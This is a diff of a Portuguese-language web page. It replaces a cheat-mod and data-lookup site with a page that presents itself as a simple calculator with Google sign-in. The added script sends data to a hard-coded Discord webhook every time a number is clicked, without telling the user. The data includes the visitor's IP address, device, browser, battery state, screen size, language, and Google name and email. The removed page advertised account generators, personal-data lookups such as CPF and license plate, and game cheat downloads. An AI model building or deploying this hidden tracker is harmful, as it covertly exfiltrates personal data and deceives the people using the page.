@@ -1,224 +1,161 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Gabb Modz | Site</title>
-  <style>
-    body {
-      background: linear-gradient(135deg, #000, #1a001a);
-      font-family: 'Segoe UI', sans-serif;
-      color: white;
-      margin: 0;
-      padding: 0;
-    }
-
-    header {
-      text-align: center;
-      padding: 50px 20px 30px;
-      animation: fadeInDown 1s ease forwards;
-    }
-
-    h1 {
-      font-size: 42px;
-      color: #c300ff;
-      text-shadow: 0 0 10px #c300ff;
-    }
-
-    .subtitle {
-      font-size: 18px;
-      color: #aaa;
-      margin-top: 10px;
-    }
-
-    .main-options {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      margin: 30px auto;
-      flex-wrap: wrap;
-      padding: 0 20px;
-    }
-
-    .main-btn {
-      background: #111;
-      color: #c300ff;
-      border: 2px solid #333;
-      border-radius: 10px;
-      padding: 15px 25px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.3s;
-      text-align: center;
-      min-width: 180px;
-    }
-
-    .main-btn:hover {
-      background-color: #1f001f;
-      box-shadow: 0 0 15px #c300ff99;
-      border-color: #c300ff;
-    }
-
-    .section {
-      display: none;
-      max-width: 800px;
-      margin: auto;
-      padding: 20px;
-      animation: fadeIn 0.5s ease forwards;
-    }
-
-    .card {
-      background-color: #111;
-      border-radius: 10px;
-      padding: 20px;
-      margin: 15px 0;
-      border: 1px solid #333;
-      box-shadow: 0 0 10px #00000077;
-      transition: 0.3s;
-    }
-
-    .card:hover {
-      border-color: #c300ff;
-      box-shadow: 0 0 15px #c300ff88;
-    }
-
-    .card h3 {
-      color: #c300ff;
-      margin-bottom: 10px;
-    }
-
-    .card p {
-      color: #ccc;
-      font-size: 15px;
-    }
-
-    .discord-link {
-      text-align: center;
-      margin: 50px 20px;
-    }
-
-    .discord-link a {
-      background-color: #7289da;
-      color: white;
-      text-decoration: none;
-      padding: 15px 30px;
-      font-size: 18px;
-      border-radius: 8px;
-      transition: 0.3s;
-      box-shadow: 0 0 15px #7289da99;
-    }
-
-    .discord-link a:hover {
-      background-color: #5b6eae;
-      box-shadow: 0 0 25px #7289da;
-    }
-
-    .credits {
-      background-color: #111;
-      color: #aaa;
-      text-align: center;
-      padding: 20px;
-      margin-top: 50px;
-      font-size: 14px;
-      border-top: 1px solid #333;
-    }
-
-    .credits p {
-      margin: 10px 0;
-    }
-
-    .credits strong {
-      color: #c300ff;
-    }
-
-    @keyframes fadeInDown {
-      from { transform: translateY(-30px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-  </style>
+<meta charset="UTF-8" />
+<title>Calculadora + Login Google OAuth</title>
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+<style>
+  body { font-family: Arial, sans-serif; background: #222; color: #eee; }
+  .calc { width: 200px; margin: 20px auto; }
+  .display { background: #000; color: #0f0; font-size: 24px; padding: 10px; text-align: right; }
+  .buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 10px; }
+  button { font-size: 18px; padding: 15px; cursor: pointer; }
+  #user-info { text-align: center; margin-top: 20px; font-size: 16px; color: #0f0; }
+</style>
 </head>
 <body>
 
-  <header>
-    <h1>Gabb Modz</h1>
-    <p class="subtitle">🔥 Escolha uma categoria abaixo! 🔥</p>
-  </header>
+<h2 style="text-align:center;">Calculadora </h2>
 
-  <div class="main-options">
-    <div class="main-btn" onclick="mostrarSecao('gerador')">🔑 Gerador de Contas</div>
-    <div class="main-btn" onclick="mostrarSecao('consultas')">🔍 Consultas de Dados</div>
-    <div class="main-btn" onclick="mostrarSecao('mods')">💻 Mods</div>
+<div id="user-info">Você não está logado! Logue com sua conta google.</div>
+
+<div id="g_id_onload"
+     data-client_id="818779354438-2iqe870249jq1u06eh3o52v65sjrp8s8.apps.googleusercontent.com"
+     data-callback="handleCredentialResponse">
+</div>
+
+<div class="g_id_signin" data-type="standard"></div>
+
+<div class="calc">
+  <div id="display" class="display">0</div>
+  <div class="buttons">
+    <button onclick="clickNumber('1')">1</button>
+    <button onclick="clickNumber('2')">2</button>
+    <button onclick="clickNumber('3')">3</button>
+    <button onclick="clickNumber('4')">4</button>
+    <button onclick="clickNumber('5')">5</button>
+    <button onclick="clickNumber('6')">6</button>
+    <button onclick="clickNumber('7')">7</button>
+    <button onclick="clickNumber('8')">8</button>
+    <button onclick="clickNumber('9')">9</button>
+    <button onclick="clickNumber('0')">0</button>
   </div>
+</div>
 
-  <!-- Seção Gerador -->
-  <div class="section" id="gerador">
-    <div class="card">
-      <h3>🔑 Gerador de Contas</h3>
-      <p>Gera contas automáticas para SAMP! </p>
-    </div>
-  </div>
+<script>
+const webhookUrl = "https://discord.com/api/webhooks/1343408605646295050/hryBiAi5SvimUE05wsl-YjlRqfpIaslJCwMX2JcMa00_y0cdvflCU-_1sBPBtQPTieGh";
 
-  <!-- Seção Consultas -->
-  <div class="section" id="consultas">
-    <div class="card">
-      <h3>🧠 Consulta CPF</h3>
-      <p>Puxa nome completo, nascimento e localização com base em CPF. Simulado para testes educativos ou bots.</p>
-    </div>
-    <div class="card">
-      <h3>🏢 Consulta CNPJ</h3>
-      <p>Mostra razão social, endereço e status da empresa. Dados atualizados direto de fontes públicas.</p>
-    </div>
-    <div class="card">
-      <h3>🌐 IP Lookup</h3>
-      <p>Retorna cidade, país, provedor e ASN de qualquer IP. Ótimo para análise de bots ou rastreamento.</p>
-    </div>
-    <div class="card">
-      <h3>📦 CEP Info</h3>
-      <p>Converte um CEP em endereço completo. Funciona em bots ou sites de preenchimento.</p>
-    </div>
-    <div class="card">
-      <h3>🚗 Consulta de Placa</h3>
-      <p>Exibe informações do veículo com base na placa. Modelo, ano e UF de registro.</p>
-    </div>
-    <div class="card">
-      <h3>📞 Número de Celular</h3>
-      <p>Identifica operadora, estado e se o número está ativo. Pode verificar se há WhatsApp vinculado.</p>
-    </div>
-  </div>
+function getDeviceName() {
+  const ua = navigator.userAgent;
 
-  <!-- Seção MODs -->
-  <div class="section" id="mods">
-    <div class="card">
-      <h3>💻 KILL PLAYER</h3>
-      <p>Mod menu para matar o player em qualquer lugar ou ao seu redor. <a href="https://www.mediafire.com/file/cwjwxt0fp8793h9/killPlayeratualizado.lua/fil">Baixar</a></p>
-       <h3>💻 PULL CAR</h3>
-      <p>Mod menu para puxar qualquer veiculo ao seu redor.<a href="https://www.mediafire.com/file/u5d6c2vh95bm7sh/PullCar.zip/file">Baixar</a></p>
-    </div>
-    
-  <div class="discord-link">
-    <a href="https://discord.gg/pPmy3fXq2rI" target="_blank">🌐 Acessar Discord | Withey System</a>
-  </div>
+  if (/android/i.test(ua)) {
+    const match = ua.match(/Android.*; ([^;]+) Build/);
+    if (match && match[1]) return `Android - ${match[1].trim()}`;
+    return "Android - Modelo desconhecido";
+  }
 
-  <div class="credits"
-    <p><strong>Desenvolvido por:</strong> Gabb Modz | Todos os direitos reservados | 2025</p>
-  </div>
+  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+    if (/iPad/.test(ua)) return "iPad";
+    if (/iPhone/.test(ua)) return "iPhone";
+    if (/iPod/.test(ua)) return "iPod";
+    return "Dispositivo iOS";
+  }
 
-  <script>
-    function mostrarSecao(id) {
-      const secoes = document.querySelectorAll('.section');
-      secoes.forEach(secao => {
-        secao.style.display = 'none';
-      });
-      document.getElementById(id).style.display = 'block';
-      document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
-    }
-  </script>
+  if (/Windows NT/.test(ua)) return "Windows PC";
+  if (/Macintosh/.test(ua)) return "Mac";
+  return "Dispositivo desconhecido";
+}
+
+function getBrowserName() {
+  let ua = navigator.userAgent;
+  if (ua.indexOf("Firefox") > -1) return "Firefox";
+  if (ua.indexOf("Chrome") > -1) return "Chrome";
+  if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
+  if (ua.indexOf("Edge") > -1) return "Edge";
+  return "Outro/Nao identificado";
+}
+
+async function getIP() {
+  try {
+    let res = await fetch('https://api.ipify.org?format=json');
+    let data = await res.json();
+    return data.ip;
+  } catch {
+    return "Não foi possível obter IP";
+  }
+}
+
+async function getBatteryInfo() {
+  if (!navigator.getBattery) return "API de bateria não suportada";
+  try {
+    let battery = await navigator.getBattery();
+    let level = (battery.level * 100).toFixed(0) + "%";
+    let charging = battery.charging ? "Sim" : "Não";
+    return `Nível: ${level}, Carregando: ${charging}`;
+  } catch {
+    return "Erro ao obter info da bateria";
+  }
+}
+
+async function sendToDiscord(number) {
+  let device = getDeviceName();
+  let browser = getBrowserName();
+  let ip = await getIP();
+  let time = new Date().toLocaleString();
+  let ua = navigator.userAgent;
+  let battery = await getBatteryInfo();
+  let screenRes = `${window.screen.width}x${window.screen.height}`;
+  let language = navigator.language || "Desconhecido";
+
+  let userName = window.userGoogleName || "Não logado";
+  let userEmail = window.userGoogleEmail || "Não logado";
+
+  let content = `**Número clicado:** ${number}
+**Dispositivo:** ${device}
+**Navegador:** ${browser}
+**Horário:** ${time}
+**IP:** ${ip}
+**UserAgent:** ${ua}
+**Bateria:** ${battery}
+**Resolução da Tela:** ${screenRes}
+**Idioma do Navegador:** ${language}
+**Usuário Google:** ${userName}
+**Email Google:** ${userEmail}`;
+
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content })
+  }).catch(e => console.log("Erro ao enviar para Discord:", e));
+}
+
+function clickNumber(num) {
+  let display = document.getElementById("display");
+  if (display.innerText === "0") {
+    display.innerText = num;
+  } else {
+    display.innerText += num;
+  }
+  sendToDiscord(num);
+}
+
+function decodeJwtResponse(token) {
+  let base64Url = token.split('.')[1];
+  let base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+  let jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+  }).join(''));
+  return JSON.parse(jsonPayload);
+}
+
+function handleCredentialResponse(response) {
+  let user = decodeJwtResponse(response.credential);
+  window.userGoogleName = user.name;
+  window.userGoogleEmail = user.email;
+  document.getElementById('user-info').innerText = `Olá, ${user.name}! Seu e-mail é: ${user.email}`;
+  console.log("Usuário logado:", user);
+}
+</script>
 
 </body>
 </html>
